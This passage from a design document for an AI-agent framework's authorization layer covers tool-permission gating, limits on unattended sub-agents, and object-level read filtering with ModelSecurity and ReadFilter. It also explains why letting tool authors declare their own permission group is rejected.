  turn - whoever could answer an approval prompt before it started still can.
- **Detached sub-agents** (`SpawnSubagentTool`, and `DelegationTool` in a chat session) are
  **background runs**. `spawn_subagent` is fire-and-forget: it returns a handle immediately, the
  parent turn ends, and the child keeps working on a pool thread with nobody on the other end to
  answer an approval prompt - which is this section's own definition of unattended. Their ceiling is
  therefore the intersection of the acting user's grants and the `<background-allowlist>`, applied by
  `ToolContext.forDetachedSubagent`, and their loop is built from that bounded context so the child's
  prompt reports what it can actually call. What the ceiling costs the child is logged at INFO by
  `SubagentSpawner`, named by capability. The deliberate consequence: a detached child loses tools its
  parent could use. That is the point - it also lost the control that made them safe - and it is made
  legible rather than silent.

The *exposure* of delegates - which sub-agents an agent is offered at all, and which ones it may spawn -
is filtered separately and for UX reasons only; see 3.2.7.

#### 3.2.6 Where it hooks in

Exactly the two existing seams, with unchanged responsibilities:

- **`AgentLoop.java:1143`** - `ToolPermissionFilter` decides the tool schemas sent to the provider.
  This is **UX**: the model never sees a capability it cannot use, so it does not propose it and does
  not narrate a denial. It is *not* the enforcement point (a model can hallucinate a tool name; a
  cached conversation can replay an older tool set).
- **`AgentLoop.java:885-919`** - `executeWithSecurityCheck` is the **enforcement point**. Every call
  passes here, including tools injected mid-run by a skill through `DynamicToolCatalog`. A name the
  run's registry does *not* resolve is deliberately **not** run through the permission check: such a
  name has no group, so the check would answer every hallucinated or misspelled name with "belongs to
  no tool group ... denied to everyone" and take away the `Available:` hint the model corrects itself
  with. Nothing is lost by not asking - an unresolvable name cannot execute either way, and the
  catalog refuses it with `Unknown tool: 'x'. Available: [...]`, the list holding exactly the tools
  the principal may call.

`ToolPermissionFilter.denialReason` (`:55-66`) already produces the LLM-facing message; the RBAC
denial adds one line naming the missing capability without naming the data:

> `Permission denied: tool 'model-editor.createClass' requires the 'model.structure' capability, which none of your roles grants.`

#### 3.2.7 Telling the agent what it lacks - UX, not a control

Filtering the schemas leaves the model unable to tell "you are not permitted" from "that skill is
not loaded yet" from "that does not exist": all three look like absence, so the agent answers the
user with a vague "I can't do that" or goes hunting for a skill it may also not use.

Six code fixes and one piece of prompt text address that:

- **Skills whose every tool is denied are not offered** (`AgentFactory.injectSkills`,
  `buildDynamicSkillTool`, all through `AgentCapabilities.unusableReason`). A skill
  with no tools at all is pure instruction text and is kept; a partly denied skill is kept and loads
  only the permitted subset; a skill whose tool names do not resolve is kept, because a typo is not a
  denial. Every dropped skill is logged at INFO with the deciding reason - silent capability loss is
  the failure mode this must not have.
- **Delegates whose every reachable tool is denied are not offered** (#264,
  `AgentCapabilities.unusableReason(AgentDefinition)`). The recursive form of the skill rule: a
  delegate's effective tool set is its own `<tools>` **plus** every tool of every skill it declares
  **plus** its MCP servers' tools **plus**, transitively, everything its own delegates reach
  (`reachableTools`). The walk visits each agent once, so a delegation cycle (A → B → A) terminates and
  the revisit contributes nothing. Three cases keep a delegate, for the reasons they keep a skill: one
  that reaches no tool at all (a **delegation-only** agent must not fall to the vacuous "all zero of
  its tools are denied"), one that is partly reachable (below), and one whose tool names resolve
  nowhere (a typo is not a denial). Every dropped delegate is logged at INFO naming the capabilities it
  needed. A principal who may use every tool loses nothing - the generated `### Available Delegates`
  section is then byte-identical to what it was before this filter existed, pinned by
  `TestDelegateFilter.testCatalogOfAPrincipalWhoMayUseEverything`.

  All **three** exposure surfaces filter, from the one judged list (`AgentFactory.delegateOffers`), so
  they cannot drift: the prompt catalog (`delegateCatalog`), the `delegate_to_*` registration in both
  catalog paths (`registerDelegationTools`, static and dynamic), and `list_agents`
  (`ListAgentsTool.execute`). Filtering only the prompt text would be cosmetic, exactly as it would
  have been for skills - the model can call a tool the prompt never mentioned. With no delegate left,
  `wait_for_subagent` is not wired in either: there is nothing to await.

  This takes nothing away from anyone. A child inherits the parent's `SecurityContext` unchanged
  (3.2.5), so a delegate whose every tool is denied could only ever have started, filtered its own
  schemas to nothing, spent a provider round trip and reported failure.

  **Partial reachability: the delegate stays, and is told to be limited.** A delegate some of whose
  tools the principal may call is still worth having - it can do that part of the job - so it is
  offered, and the catalog line under it names the capabilities it *cannot* use, in the same register
  as the capability notice below (`Limited for this user - it cannot use: ...`, each capability with its
  group description). `list_agents` says the same thing in its `cannotUse` field. The alternative -
  offering it silently - makes the parent discover the limit by sending work that comes back refused,
  which costs a child run and a turn and teaches the model nothing it can tell the user. Dropping it
  instead would be worse still: it would remove a capability the user actually holds. A delegate the
  principal can use in full is not annotated at all, so the notice only ever appears where there is
  something to say.
- **A spawn that could only come back empty-handed is refused** (`SubagentSpawner.detachedSpawnRefusal`).
  `spawn_subagent` names its target at call time, so there is no list to leave it out of: the same
  predicate is applied to the name the model asked for, and the answer is an **ordinary tool error**
  rather than an exception, because what the user has to hear is which capability to ask for. Without it
  the two surfaces contradicted each other - `list_agents` is the surface that feeds the spawn decision
  and it already filters, so an agent could read a name out of a filtered listing and spawn it anyway.

  **Judged against the context the child will get, not the parent turn's.** A detached spawn is a
  background run (3.2.5), so the predicate is asked of `security().withBackgroundCeiling()`: an agent the
  parent turn reaches in full can be out of reach once the allowlist applies, and that case is refused
  with the unattended wording - *"A spawned subagent runs unattended ... it cannot reach the capabilities
  its tools require, even though this user holds them"*. Telling a user they lack a right they do hold
  would send them to their administrator for the wrong change; the split is
  `AgentCapabilities.lostToBackgroundCeiling`, the same one the capability notice uses.

  A **synchronous** delegation refuses the same way, in `DelegationTool.delegationRefusal` (#348), and
  for the same reason: the catalog filter in front of it is a filter, and a `delegate_to_*` the model
  can still call would contradict it. It is asked of the parent turn's own context, which is what the
  child inherits, and carries no unattended wording: a synchronous delegation completes inside the
  parent turn and loses nothing to the allowlist that the parent had not lost already. Neither refusal
  ever says or implies that the agent does not exist - it does, and a model told otherwise looks for
  another name for the same work. An agent that really is unknown is not refused here either: that is
  not a denial, and the run fails where it always did.

  **Which grant to ask for depends on what refused** (#517). Both messages used to be composed out of
  capability names whatever the cause, and three of the four causes are not capability problems at all:
  `<agent-access>` withholding the agent, the agent being `infrastructure`, and the model or MCP server
  the agent itself uses being denied. Naming a capability there is worse than saying nothing - the model
  is told to relay it, and the user takes it to an administrator whose grant leaves the run refused.
  `AgentCapabilities.unusableReason(AgentDefinition)` therefore answers an `Unusable` - a cause plus the
  message - rather than a bare sentence, and the two refusals compose the capability text only for
  `NO_REACHABLE_TOOL`. For the other three they relay `RoleAccessPolicy.Decision.Denied#message()`, which
  names the setting an administrator would change, and add no capability list. Pinned by
  `TestSpawnFilter`, `TestAgentGate` and - on the deployed policy, where `<agent-access>` is what
  refuses - `SecDemoSpawnFilterTest`.

  **A fifth cause, and the same reasoning** (#258 follow-up): every tool the thing reaches works on
  model types the account may not read. `Unusable.Cause.TYPE_UNREADABLE` is also not about
  capabilities, and the remedy it names is a Read grant on the type - see section 3.3.3, which also
  says why the skill and the per-tool forms answer it too. Pinned by `TestCapabilityDeclaredTypes`.
- **`loadSkill` no longer advertises tools the principal cannot call** (`SkillTool.addSkillTools`).
  It used to register and announce every resolvable tool of a skill; the next turn's schema filter
  then removed exactly the denied ones, so an authoritative tool result contradicted the tool list.
- **A `loadSkill` for a skill that is not there says which absence it is** (#281,
  `AgentCapabilities.skillAbsenceReason`, wired in `AgentFactory.absenceReason`). The same trichotomy
  as `ToolCatalog.absenceReason` above, in the same vocabulary, for the other surface the model
  discovers absence on. A skill this agent declares and the acting user may use nothing in is
  *withheld from the current user*, naming the capabilities its tools require. The same skill in an
  **unattended** run, where the `<background-allowlist>` is the ceiling that removed it
  (`SecurityContext.withheldByBackgroundCeiling` → `AgentCapabilities.lostToBackgroundCeiling`), says
  *this run is unattended* instead: the acting user's roles are not the reason and an administrator
  asked to grant a role they already granted finds nothing to do. A skill the application has and this
  agent never declared says so and names an administrator, exactly as the not-carried tool case does,
  and names no capability. An id that resolves nowhere keeps the plain "not available for this agent"
  with the loadable-skill list, so a typo still discloses nothing. Each permission case ends with the
  anti-guessing sentence the notice below carries. Before this, all four read "Skill '...' is not
  available for this agent", and an agent refused `TL_agenticAuthoring` reported the missing
  capability as `script` - to a user for whom `script` was the reason for nothing.
- **A skill's description must not point at a skill the reader cannot load** (#281). A cross-reference
  between framework skills - added deliberately, because agents used to load the wrong one - becomes a
  dead end as soon as the referenced skill is filtered for the acting user. Where the referring skill
  can simply *carry* the tool its guidance depends on, it does, and the filter then drops the pair
  together: `TL_tlScriptInstanceCreation` declares `executeTLScript` rather than telling the reader to
  load `TL_tlScriptWriting` for it. A guidance-only skill declares no tools, always survives the
  filter, and is therefore the one shape that can be offered to a user who cannot act on it. Where the
  referenced skill belongs to a different domain and carrying its tools would drop the referrer for the
  users who need it (`TL_agenticAuthoring` → `TL_tlScriptWriting`), the description says what to do
  when the reference is unreachable instead. `TestFrameworkSkillReferences` fails on a cross-reference
  that does neither.
- **A call for an absent tool says which absence it is** (`ToolCatalog.absenceReason`). A name no skill
  declares and no registry knows stays `Unknown tool` with the permitted-only available list. A name
  one of the agent's own skills declares is answered with "load that skill". A name the service
  registry resolves but the agent carries nowhere - the case of a TL-Script tool that no framework
  agent lists - says so, and says that an administrator would have to add it to the agent or to a
  skill. That last one used to read as `Unknown tool`, and an agent bridged the gap by reporting a
  capability the user happened to lack: *"This agent lacks the `agent.authoring` capability"*, to a
  user who was fully authorized. `DynamicToolCatalog.setReachableBySkill` is what separates the
  skill case from the not-carried case; it is used for the message only, never for lookup.
  A capability *is* named where the application really has the tool and the acting user really is
  denied it - that is the ordinary denial reason, not a guess. A name that resolves nowhere never goes
  through the permission check at all, so a typo still cannot make the answer disclose which
  capabilities the user lacks.
- **The agent can ask what it carries** (`ListToolsTool`, injected by `AgentFactory.listToolsTool`).
  Every message above answers a question the model *stumbled into* - a refused call, a skill it could
  not load. None of them answers the question a user asks directly: *"can you use `X`?"* Asked that, the
  agent had no source at all, and its prompt sent it to the registry-wide inspection in
  `TL_agenticAuthoring` instead - a privileged skill that is withheld from an ordinary user, whose
  refusal the model then relayed as though the capabilities behind *that skill* were the reason the
  *named tool* was unreachable. Nothing untrue had been emitted; the model was answering from nothing.
  `listTools` is the source: this agent's own tools, every skill it declares with what a load would hand
  over, and the capability behind each withheld entry (`AgentCapabilities.unusableReason(Tool)`, quiet,
  so enumerating a catalog writes no audit line for calls nobody made).

  **Self-inspection only, and never withholdable.** It answers "what do *I* carry", never "what does
  this application have" - that second question is registry-wide inspection and stays behind
  `agent.meta`. Its group `introspection` is in `RoleToolAccess.IMPLICIT_BASELINE`, so it reaches every
  role and every run without a `<baseline>` entry, unattended runs included; an explicit `<deny>` still
  wins, as for `interaction`. A capability that could be *forgotten* would put the guessing back one
  level down, in exactly the deployments whose policy was written carelessly. It is injected into every
  agent's catalog rather than declared in `<tools>`, for the same reason `loadSkill` is: it is a property
  of being an agent, not a capability an application decides to hand out.

  It discloses nothing new. Every entry is filtered for the acting user, and a withheld entry names the
  capability the notice below already names in the system prompt - the same information, asked for rather
  than stumbled into.
- **The generated skill catalog names the capabilities the principal lacks**
  (`AgentCapabilities.notice`), computed from the tools *this agent* can reach - its own `<tools>`
  plus its skills' - rather than from every group in the deployment. A denied capability then costs
  one short line instead of a full JSON schema, and the agent can name it to the user. Each name
  carries the group's own one-sentence description (`ToolGroups.labelKey`), because a group named
  without one invites the model to read the name and guess: `agent.authoring` was explained to a user
  as being about the data model. The section also states all three absences and tells the agent not to
  blame a capability unless the message it got names one - and every message that *does* name one closes
  by saying which subject those names belong to (`AgentCapabilities.NO_GUESSING`), because the
  withheld-skill message names capabilities correctly for the skill it refused and was still relayed as
  the reason a different tool was unreachable.

  **Independent of whether the agent declares skills.** The notice is appended to the generated skill
  catalog, and that catalog used to be empty for an agent with no skills - so the one agent shape with
  nothing to load was the one shape never told which capabilities its user lacks, and (once a detached
  subagent became a background run) never told that its own run is unattended either. What an agent
  cannot do is not a property of its skills. An agent *with* skills gets the same bytes as before, and
  one with neither skills nor anything to report still gets nothing at all - no empty heading and no
  stray whitespace. This does change the system prompt of a skill-less agent under enforcement, which
  is the fix.

**This prompt text is UX, not a control**, and must not be read as closing anything: see section 2.2
- all gates in this design are deterministic Java checks on the call path, never prompt instructions.
It is emitted for every run, and a principal who holds every capability its tools require is told
exactly that rather than being given a list of gaps.

#### 3.2.8 Why a tool must not declare its own group when its author is not trusted

Dropping a whole skill (3.2.7) makes the ungrouped TL-Script tool a live problem rather than a
theoretical one: every script tool is denied to everyone until an administrator classifies it, so a skill built out of
them disappears - for its author too. The obvious fix is to let the tool's configuration name its own
group. **That fix is wrong, and it is not implemented.**

A tool's group states what the tool *does*; the check asks what the *user* holds. Whoever decides the
group therefore decides which capability it costs to call the tool. `ScriptToolAuthoringTool` is
reachable with `agent.authoring` and holding that is not holding `data.write`, so a self-declared
group is a crossing of the group boundary: author a tool whose TL-Script body writes, declare it
`data.read`, and a user with only `data.read` may now write. Today's behaviour is the correct one -
an unclassified tool is denied to everyone, which is fail-closed and unforgeable.

Classification stays with the administrator, in `<tool-groups>`, where each tool is named by any of
`ToolIdentity.names()` (`RoleToolAccess.groupOf`; pinned by
`TestRoleToolAccess.testConfiguredGroupClassifiesAnUngroupedScriptTool`). The entry is a multi-valued
property whose options come from the tool registry, so the editor offers a selection of the tools that
exist.

There is deliberately **no** pattern syntax - no `{factory}.*`, no per-server catch-all. A pattern would
hand the same authority back: `createScriptTool` lets its caller choose the factory name freely, so
`reporting.*` mapped to `data.read` would let anyone who can author into `reporting` put a *writing*
tool under a capability their user holds only for *reading*. Naming tools one at a time costs a line per
tool and keeps the decision where the argument above puts it. The consequence is that a tool which
appears after the policy was written - a new Java tool, a newly authored script tool, a tool a connected
MCP server grew - is denied until an administrator names it.

### 3.3 L2 - Data authorization via `ModelAccessRights` (#29088)

#### 3.3.1 The typed façade

The dead `Object`-typed stubs (`SecurityContext.hasReadAccess/hasWriteAccess`) are replaced by a typed
façade reachable from every tool through the context it already receives:

```java
public interface ModelSecurity {

    boolean canRead(TLObject obj);
    boolean canRead(TLObject obj, TLStructuredTypePart attribute);
    boolean canWrite(TLObject obj);
    boolean canWrite(TLObject obj, TLStructuredTypePart attribute);
    boolean canDelete(TLObject obj);
    boolean canCreate(TLClass type, TLObject context);
    boolean canCreate(TLObject parent, TLStructuredTypePart compositionAttribute);
    boolean canPerform(TLObject obj, BoundCommandGroup operation);   // custom business operations

    <T extends TLObject> List<T> filterReadable(Collection<T> objects);
    Set<TLClass> accessibleTypes(BoundCommandGroup operation);

    /** Throws {@link ToolSecurityException} instead of returning false. */
    void requireRead(TLObject obj);
    void requireWrite(TLObject obj);
}
```

- Reached as `context.modelSecurity()` from `ToolExecutionContext`, so tools need no new plumbing.
- Bound to the run's `Person` at construction; no per-call `TLContext` read (see 3.1).
- Delegates straight to `ModelAccessRights.getInstance()`; it adds **no policy of its own**. This
  matters: two places deciding "may this be read" is one place too many.
- `ToolSecurityException` carries a message safe to feed back to the model (names the operation and
  type, never the withheld value) and is mapped by the dispatcher to a denied tool result plus an
  audit record.

Mapping to the engine API, as implemented in `ModelAccessRightsSecurity` against released
`8.0.0-alpha7`:

| Façade | Engine call |
|---|---|
| `canRead(obj)` | `isAllowed(person, obj, SimpleBoundCommandGroup.READ)` |
| `canRead(obj, attr)` | `isAllowed(person, obj, attr, SimpleBoundCommandGroup.READ)` |
| `canWrite(obj)` | `isAllowed(person, obj, SimpleBoundCommandGroup.WRITE)` |
| `canDelete(obj)` | `isAllowed(person, obj, SimpleBoundCommandGroup.DELETE)` |
| `canCreate(type, ctx)` | `isAllowedCreate(person, type, ctx)` |
| `canCreate(parent, attr)` | `isAllowedCreate(person, parent, attr)` |
| `canPerform(obj, group)` | `isAllowed(person, obj, group)` |
| `accessibleTypes(group)` | `getAccessibleTypes(person, group)` |
| `filterReadable(coll)` | `isReadAllowed(person, obj)` per element |

`filterReadable` iterates rather than calling `SearchExpression.filterSecurity(person, coll)`: that
helper is `Object`-typed and shape-preserving, so routing a `Collection<T>` through it would need an
unchecked cast to get a `List<T>` back, for no gain - the per-object check it performs is exactly
`isReadAllowed`.

There is no mode in which the façade returns `true` everywhere. `ModelSecurity.UNCHECKED` still exists
and still does exactly that, but it is a test seam: every production context carries a
`ModelAccessRightsSecurity` built from the run's principal.

#### 3.3.2 Retrofitting the Java tools · **implemented** (#289)

Every conversion of a `TLObject` into something a model sees goes through **one** class, `ReadFilter`,
and an instance of it cannot exist without the `ModelSecurity` of the run being served. That shape is
the point rather than a detail: the three leaks #289 closed were three tools that had each written
their own serializer and each forgotten the check. So the serializers that made forgetting easy were
**deleted**, not documented, and what is left takes the principal's rights as an argument.

Two things make the unsafe path absent rather than discouraged:

- **`TidResolver.resolve(String, ModelSecurity)` has no single-argument form.** It is the only place a
  model-supplied TID becomes a live object in `tl-ai-core`, so a tool cannot reach an object the run
  named without saying whose rights apply. An object the principal may not read is refused with the
  message of one that does not exist - "exists but hidden" is itself a disclosure.
- **`ExecutionResult.toJson(ReadFilter)` has no argument-less form.** `All.all()`'s javadoc says the
  caller secures the result; this is where tl-ai does.

**What a refused identifier is told** (#386). "Invalid TID format" is true of every wrong identifier
and helps with none of them, so `TidDiagnostics` classifies the string the model wrote and names the
remedy: a uuid copied out of a read answer, an object pasted in its printed form, a type name no
table has, an abstract table, an id the engine's parser rejects, or none of those. An application
adds the one class the framework cannot know - the code its own users speak, `LEAD-014` - as a
pattern and a sentence in the `<object-ids>` section of `LLMService`; a configured hint is tried
first. The classification runs **on the error path only**, so a resolution that succeeds costs
nothing extra, and it asks the type repository about the type name rather than the database about
the object. The security property survives it: every refusing branch of `resolve` calls the *same*
method with the *same* string, so an object the principal may not read and an object that does not
exist are refused with the same sentence character for character - asserted, for one object, in
`TestTidResolverDiagnostics.testAHiddenObjectIsRefusedLikeAMissingOne`. Nothing in the diagnosis
asks whether an object exists.

What `ReadFilter` enforces:

1. An unreadable object contributes **nothing** - no `_tid`, no `_type`, no `_display`, no attribute
   value - and is *omitted* from a collection rather than replaced by a placeholder, because a
   placeholder still discloses existence and count.
2. `attributesOf` respects **per-attribute** Read; an attribute the principal may not read is left out
   and the object still renders.
3. Filtering is recursive, through collections, map keys, map values, arrays and object-valued
   attributes. The traversal mirrors `SearchExpression.filterSecurity` down to returning the input
   unchanged when nothing had to be removed.

**What it does not claim: aggregates.** A count computed inside TL-Script is a number by the time it
arrives, and no read filter can tell which objects it counted. Cardinality is accepted, not fixed
(issue **#291**); the honest control is denying the `script` capability. `TestReadFilter` states that
boundary as a test so it is not mistaken for an oversight.

##### What labels are, by design

The paragraph above has a second half, and it is the more surprising one. A **label** is not read-scoped
either - and unlike the aggregate case, that is not a gap in this design. It is the engine's own position
on what a label *is*.

The path, in `8.0.0-alpha7`:

```
TL-Script  toString($obj)   ->  ToString
           "" + $obj        ->  the same coercion
                            ->  SearchExpression.asString(value)
                            ->  (not a number, boolean or CharSequence)
                            ->  MetaLabelProvider.INSTANCE.getLabel(value)
                            ->  generic Java model access (tValue), NOT access-checked
                            ->  a String
```

Only TL-Script's **attribute** access (`AccessLike.lookupValue`) consults `ModelAccessRights`. Label
rendering does not, deliberately. The engine states the rule in `FilterSecurity`'s own javadoc:

> Access operations in TL-Script return referenced objects *unfiltered* (consistent with the user
> interface, which always shows a referenced object by its label and only secures navigation into it);
> only the access to the *attributes* of an object is denied if the user must not read the object.

So by the time the value reaches `ReadFilter` it is a `String`, not a `TLObject`, and there is nothing
left for a filter to recognise. **This will not change** (`Refs #296`). Two consequences follow, and
both belong in the design rather than in an issue backlog:

- **Object labels are non-secret by design.** The whole product treats them that way: a reference is
  rendered by its label in every table, every tooltip and every selector, and what is secured is
  navigating into the object, not naming it.
- **The modeller carries the obligation.** An application must not encode confidential information in
  the name of an object. If a contract's *name* has to be secret, the secret belongs in an attribute
  with its own `<part>` grant - which *is* read-scoped - and the object's label must not repeat it.

Note what a label actually discloses, because it is less than "the object". A label is whatever the
model's label provider renders. In the fixture `pm:Project` has a `name`, so its label *is* the project
name; `pm:Ticket` has no name attribute, so its label is the generic *"Unnamed object of type Ticket"*
(in the user's language). Coercing tickets therefore discloses **how many** exist and nothing else -
which is exactly the cardinality boundary of **#291**, reached by a second route. The two accepted disclosures are one family: a script can reduce an
object to a plain value (a number, a string) before any output filter runs, and an output filter cannot
recover what the value was.

**The control exists and is the caller's**, which is why this is guidance rather than enforcement.
`filterSecurity(...)` - the engine's registered TL-Script function backing
`SearchExpression.filterSecurity` - applies the current user's read permissions to a value, dropping the
objects the user may not read, recursively through collections and maps. Applied *before* the coercion,
there is no object left to label:

```
filterSecurity(all(`pm:Project`)).map(p -> toString($p))   // scoped to what the user may read
all(`pm:Project`).map(p -> toString($p))                   // every label, by design
```

Three places say so, so that an agent meets it wherever it enters: the `TL_tlScriptWriting` skill, the
`executeTLScript` tool description, and rows **D7** / **D8** of
[testbed.md](../../tl-ai-demo/doc/secdemo/testbed.md#53-read-filtering---what-a-permitted-tool-then-discloses-issue-289), which
assert both halves against the running fixture. The blunt control, for an account that must learn
neither a label nor a count, is to withhold the `script` capability - it is not in the default baseline
for this reason among others.

The tools that needed the retrofit, and what each got:

| Tool | Change |
|---|---|
| `InstanceBrowserTool.listInstances` | Filters the instance list through `readable(...)` **before** the count is taken and before the page is cut, so `totalCount` is the number of instances the user may see. An unfiltered `totalCount` leaks cardinality; a page cut before the filter leaks it through short pages. |
| `InstanceBrowserTool.getInstance` | Resolves the TID through the read check, then serializes only the attributes `canRead(obj, attr)` allows. The container is another object's identity and is disclosed only when that object is readable too. |
| `TLScriptTool.executeTLScript` | The result is disclosed through `ReadFilter`; the reported `resultType` is the type of the *filtered* value, so a script whose whole result is one hidden object reports `null` rather than `object`. |
| `ScriptToolExecutor` (every configured TL-Script tool) | Result rendered through `ReadFilter.text(...)` instead of `SearchExpression.asString(...)`, which labels a model object. Object-typed *arguments* are read-checked where their TID is resolved, so a script body cannot be handed an object the principal may not read. |
| `ViewDocumentTool.viewDocument` | Its own `canRead` check replaced by the resolver's, so "no such object" and "not yours" are one answer. |
| `tl-ai-mcp-server`'s `InstanceResource` / `TypeInstancesResource` / `<dynamic-resources>` | The MCP *resource* surface serialized instances the same way the two tools used to, and read in a system interaction for a caller nobody authenticated. It now reads as the authenticated account and discloses through this same filter: `InstanceResource` answers "not found" for an object the account may not read and leaves out an attribute it may not read; `TypeInstancesResource` filters before it counts and paginates; a configured TL-Script resource has its result passed through `visible(...)`. Same aggregate caveat (**#291**). Asserted against real accounts by `SecDemoMcpEndpointTest` (#261) |
Still outstanding, and out of #289's scope:

| Tool | Change |
|---|---|
| `ModelSearchTool.searchModel` | Searches *model elements* - types, attributes, labels - not instances, so it discloses model structure rather than business data. Bounded by `accessibleTypes(READ)`, the bound `ModelBrowserTool.outlineModel` now carries (section 3.4.2); the enumerating methods have not been retrofitted |
| `ModelBrowserTool.listModules` / `listTypes` / `listTypeParts` / `listClassifiers`, `TypeAnalysisTool.*` | Restrict enumeration to `accessibleTypes(READ)` (section 3.4.2). `outlineModel` - the one that hands over the whole model in a single call, and therefore the one that mattered - is done (#295); these enumerate the same information a type at a time |
| `tl-ai-mcp-server`'s model-metadata resources (`ModuleTypesResource`, `TypePartsResource`, `EnumerationClassifiersResource`, `TypeUsagesResource`, `ConfigSchemaResource`) and `tools/list` | These disclose model *structure* rather than business data, so the read filter has nothing to filter. Bounding them by `accessibleTypes(READ)` is the same open item as the `ModelBrowserTool` enumeration above (section 3.4.2); `tools/list` additionally cannot be filtered per caller within MCP Java SDK 1.1.4. Both are disclosed only to an *authenticated* caller since #261 |
| `ModelEditorTool.*`, `ModelAnnotationEditorTool.*` | Structural: gated by the `model.structure` group at L1; L4 backstops the commit |
| `TLScriptTool.executeTLScript` | Already enforced by the engine inside TL-Script as of `8.0.0-alpha7`; assert user context, never a system interaction. That enforcement was never gated by tl-ai at all, and it denies by default - see section 6 |
| `VectorIndexSearchTool` | **Done** (#295): filtered at query time through `VectorReadFilter`, and what it reports is the live object through `ReadFilter` rather than the indexed chunk. Section 3.4.3 |
| `McpTool` (all remote tools) | Cannot be introspected and declares no group, so it is ungrouped and therefore denied until an administrator classifies it in `<tool-groups>`. Same for `ScriptToolExecutor`, i.e. every TL-Script tool authored in the running application. Classification stays with the administrator on purpose - a self-declared group would let whoever authors a tool choose which capability it costs to call (see 3.2.8) |

#### 3.3.3 Declared types - L1b

A tool names the qualified model types it works on, and the names are checked against the acting
principal's READ rights before the tool runs (**#258**):

```java
@ToolMethod(description = "...", mode = ToolMode.READ,
            group = "data.read", types = { "myapp:Customer", "myapp:Contract" })
```

**The rule.** A tool that declares types is refused when the principal may read **none** of them, and
is left out of the tool schemas the provider request carries for the same reason. Not "one of them is
unreadable": a tool naming `Customer` and `Contract` can still do the customer half of its job for a
user who may read customers, and refusing it would take away work that user is allowed to do. Gate and
schema filter are the same predicate on purpose - a rule that refused on one unreadable type while the
filter dropped only fully unreadable tools would advertise a tool that every call to it refuses, which
the model can only discover by spending a turn on it.

`DeclaredTypeAccess` decides, `ToolPermissionFilter` asks it - the one seam both the schema filter
(`AgentLoop.callProviderOnce`) and the invocation gate (`AgentLoop.executeWithSecurityCheck`, and
`McpToolAdapter` for the server side) already go through. The refusal is an ordinary tool error:
flagged `is_error`, excluded from the turn's rollback decision like every other denial, and logged at
`info` rather than `warn`, because an account without a read right is a configured state and not an
operator's problem.

**And `AgentCapabilities` asks the same check**, over a `DeclaredTypeAccess` built from the very
`SecurityContext.modelSecurity()` the filter uses - one rule, asked where it is needed, never two.
That is what keeps the surfaces of section 3.2.7 honest: `listTools` would otherwise advertise a
declared tool the schema filter drops, a skill whose only tool is type-withheld would count as usable,
and every one of those refusals would have blamed a capability. The last is the wrong-remedy defect of
#517 one layer down, and one step worse: the capability a type-withheld tool costs is one the acting
account **holds**, so naming it sends an administrator looking for a grant that is already there.

A tool, skill or agent that nothing but its declared types withheld therefore answers
`Unusable.Cause.TYPE_UNREADABLE`, whose `aboutCapabilities()` is false, and `SubagentSpawner`,
`DelegationTool` and `listTools` relay the sentence naming the type and list no capability. One
capability-denied tool in the set is enough to make the cause `NO_REACHABLE_TOOL` again - a capability
grant then really does reach something - and the message names the types as well, so that the grant is
not expected to reach the rest. `TestCapabilityDeclaredTypes` pins all of it on the `TypeReadAccess`
seam; `SecDemoDeclaredTypesTest` pins what the real model rights answer.

**What it buys**, which is what #258 asked for:

1. **A pre-flight refusal with a reason.** "you have no read access to `myapp:Customer`" instead of an
   empty result the model reports to the user as "there are no customers". The sentence also says that
   a *model access* right and not a tool permission is the cause, so nobody goes looking in
   `<tool-access>` for an entry that is already correct.
2. **Schema filtering.** The tool is not offered, so the model does not plan around it.
3. **Reviewability.** A reviewer reads off which tools claim which types.

**It reads roles on the security root**, through `ModelSecurity.accessibleTypes(READ)` - the same
computation the model digest and the read filter use (#295). It is an L1 check and has L1's scope, so
section 3.3.4's tier/scope distinction decides which types may be declared at all:

> **Declare a type only where its READ grant goes to a role held on the security root.** A type whose
> read right is derived *per object* must **not** be declared. `tl.ai.screenshots:Screenshot` grants
> Read to `AiBinaryOwner`, which a `<rule type="reference">` derives from the screenshot's own owner
> (section 4.6): nobody holds that role on the root, so declaring the type would refuse the owner
> their own screenshot. Where you cannot tell, declare nothing.

That is why **no tool shipped in this repository declares a type**. tl-ai's own model types are either
owner-derived (`Screenshot`, `CookiePool`) or carry no `<security-config>` at all
(`tl.ai.execution:UserMemory`, `AgentSession`, `tl.ai.core:Agent`), and model access is deny-by-default
- so a declaration on any of them would refuse the tool to every non-administrator. Declaring is a
statement an *application* makes about its own tier grants; the mechanism, the rule and the two
outcomes are exercised end to end by the test bed's `secdemo-projects.listProjects` /
`listProjectsUndeclared` pair (`SecDemoDeclaredTypesTest`), which differ in the declaration and in
nothing else.

**Tools that cannot declare anything.** Instance browsing (`listInstances`, `getInstance`), TL-Script
execution and the search tools take their type from an *argument*, so there is nothing fixed to name.
They declare nothing and are never refused on this ground; what governs them is the per-object
checks that apply to every tool regardless - `ModelSecurity.canRead` on each object, `TidResolver` on
each identifier, the read filtering of the results (3.4) and the pre-commit guard (3.5). The same
holds for every tool that has no annotation to carry a declaration: a TL-Script tool and a remote MCP
tool declare nothing by construction.

**Still not a substitute for a check.** A tool can declare a type it does not touch, or touch one it
did not declare, so L2 and L4 apply in full whatever the declaration says. A declaration makes a
refusal *legible*; it never makes a check unnecessary, which is also why a name that resolves to no
type of the application model is skipped with a warning rather than treated as a denial.

#### 3.3.4 How RBAC and ABAC combine

```
        ┌───────────── L1 RBAC: may this PERSON use this TOOL? ─────────────┐
        │  role grants tool  AND  agent grants tool  AND  mode allows mode  │
        └───────────────────────────────┬───────────────────────────────────┘
                                        │ pass
        ┌───────────────────────────────▼───────────────────────────────────┐
        │  L2 ABAC: may this PERSON perform this OPERATION on THIS OBJECT?  │
        │  ModelAccessRights.isAllowed(person, instance, commandGroup)      │
        │  = type/module/attribute grant  AND  role held on the instance    │
        └───────────────────────────────┬───────────────────────────────────┘
                                        │ pass, per object
        ┌───────────────────────────────▼───────────────────────────────────┐
        │  L3 pre-filter results  ·  L4 re-assert before commit             │
        └───────────────────────────────────────────────────────────────────┘
```

**The two layers ask about the same role at different objects, and that is what makes one role name do
both jobs.** L1 reads roles **on the security root**, because a tool call has no object yet when the
gate runs; L2 reads them **on the object being touched**. So a role has to be assigned *twice* to be
useful: once on the root, by a `<singleton-rule>`, which is the *tier*; and once on business objects,
by a role rule derived from the data, which is the *scope*.

Worked example - a clerk holding role `SalesAssistantUser` asks "list all customers and raise their
credit limit". `SalesAssistantUser` is assigned by two rules: a `<singleton-rule>` on
`SecurityStructure#ROOT` for the members of group `salesAssistants`, and a `<rule type="reference">`
that derives it on each `Customer` of the clerk's own region.

